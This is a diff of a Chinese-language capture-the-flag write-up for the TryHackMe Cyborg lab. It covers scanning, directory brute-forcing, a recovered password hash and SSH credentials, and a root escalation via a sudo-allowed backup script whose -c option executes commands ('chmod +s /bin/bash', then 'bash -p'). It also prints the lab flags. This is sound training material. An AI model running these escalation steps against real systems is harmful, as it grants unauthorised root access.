@@ -1,10 +1,10 @@
 #服务发现
 ```
 ┌──(root💀kali)-[~/tryhackme/Cyborg]
-└─# nmap -sV -Pn 10.10.8.49
+└─# nmap -sV -Pn 10.10.56.66
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-09 10:32 EDT
-Nmap scan report for 10.10.8.49
+Nmap scan report for 10.10.56.66
 Host is up (0.31s latency).
 Not shown: 998 closed ports
 PORT   STATE SERVICE VERSION
@@ -20,7 +20,7 @@ Nmap done: 1 IP address (1 host up) scanned in 45.80 seconds
 #爆破目录
 ```
 ┌──(root💀kali)-[~/tryhackme/dirsearch]
-└─# python3 dirsearch.py -u http://10.10.8.49 -e*
+└─# python3 dirsearch.py -u http://10.10.56.66 -e*
 
   _|. _ _  _  _  _ _|_    v0.4.2                                             
  (_||| _) (/_(_|| (_| )                                                      
@@ -28,29 +28,29 @@ Nmap done: 1 IP address (1 host up) scanned in 45.80 seconds
 Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak                                                                    
 HTTP method: GET | Threads: 30 | Wordlist size: 15492
 
-Output File: /root/tryhackme/dirsearch/reports/10.10.8.49/_21-10-09_10-55-20.txt
+Output File: /root/tryhackme/dirsearch/reports/10.10.56.66/_21-10-09_10-55-20.txt
 
 Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-09_10-55-20.log
 
-Target: http://10.10.8.49/
+Target: http://10.10.56.66/
 
 [10:55:21] Starting: 
 [10:55:28] 400 -  302B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd            
 [10:55:35] 403 -  275B  - /.ht_wsr.txt                                                                                                                                                                                                                                                                                            
-[10:56:08] 301 -  308B  - /admin  ->  http://10.10.8.49/admin/                                                             
+[10:56:08] 301 -  308B  - /admin  ->  http://10.10.56.66/admin/                                                             
 [10:56:10] 200 -    6KB - /admin/                                   
 [10:56:11] 403 -  275B  - /admin/.htaccess                          
 [10:56:11] 200 -    6KB - /admin/?/login                            
 [10:56:11] 200 -    5KB - /admin/admin.html                         
 [10:56:14] 200 -    6KB - /admin/                                                                                                                                    
-[10:57:18] 301 -  306B  - /etc  ->  http://10.10.8.49/etc/                                                                                                                                                                                   
+[10:57:18] 301 -  306B  - /etc  ->  http://10.10.56.66/etc/                                                                                                                                                                                   
 [10:57:18] 200 -  925B  - /etc/                                                                                                                                                                                                              
 [10:57:31] 200 -   11KB - /index.html                                       
 [10:58:14] 403 -  275B  - /server-status                                    
 [10:58:14] 403 -  275B  - /server-status/ 
 ```
 
-在```http://10.10.8.49/etc/squid/passwd```找到一个登陆凭证
+在```http://10.10.56.66/etc/squid/passwd```找到一个登陆凭证
 
 >music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
 
@@ -109,8 +109,8 @@ alex:S3cretP@s3
 #登录alex账号，拿到user flag
 ```
 ┌──(root💀kali)-[~/tryhackme/Cyborg]
-└─# ssh alex@10.10.8.49                                                                                                                                                                                                                130 ⨯
-alex@10.10.8.49's password: 
+└─# ssh alex@10.10.56.66                                                                                                                                                                                                                130 ⨯
+alex@10.10.56.66's password: 
 Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -145,5 +145,93 @@ User alex may run the following commands on ubuntu:
     (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
 
 ```
-linpeas.sh
-/etc/mp3backups/backup.sh
+
+我们查看backup.sh的源代码
+
+```
+alex@ubuntu:~$ cat /etc/mp3backups/backup.sh
+#!/bin/bash
+
+sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt
+
+
+input="/etc/mp3backups/backed_up_files.txt"
+#while IFS= read -r line
+#do
+  #a="/etc/mp3backups/backed_up_files.txt"
+#  b=$(basename $input)
+  #echo
+#  echo "$line"
+#done < "$input"
+
+while getopts c: flag
+do
+        case "${flag}" in 
+                c) command=${OPTARG};;
+        esac
+done
+
+
+
+backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"
+
+# Where to backup to.
+dest="/etc/mp3backups/"
+
+# Create archive filename.
+hostname=$(hostname -s)
+archive_file="$hostname-scheduled.tgz"
+
+# Print start status message.
+echo "Backing up $backup_files to $dest/$archive_file"
+
+echo
+
+# Backup the files using tar.
+tar czf $dest/$archive_file $backup_files
+
+# Print end status message.
+echo
+echo "Backup finished"
+
+cmd=$($command)
+echo $cmd
+```
+
+看源码是备份所有.mp3文件
+我一开始还以为是通过```tar```命令提权，因为假如一个文件的名字叫```xxx.mp3  --checkpoint=1```可以被执行的话，那就可以通过tar执行一个shell，但是反复试了多次还是不行
+
+后来看大佬的writeup，发现重点是在这段代码（我一开始没看明白这段是在表达什么，所以遗漏了这个提权点）：
+```
+while getopts c: flag
+do
+        case "${flag}" in 
+                c) command=${OPTARG};;
+        esac
+done
+
+...
+cmd=$($command)
+echo $cmd
+```
+
+它实际上相当于接收一个"-c"的命令，然后再执行这个命令，例如
+
+```
+alex@ubuntu:~/Music$ sudo /etc/mp3backups/backup.sh -c whoami
+
+root
+```
+
+
+加SUID到bash命令，提权到root
+```
+sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"
+alex@ubuntu:~/Music$ bash -p
+bash-4.3# whoami
+root
+bash-4.3# cat /root/root.txt 
+flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
+```
+
+
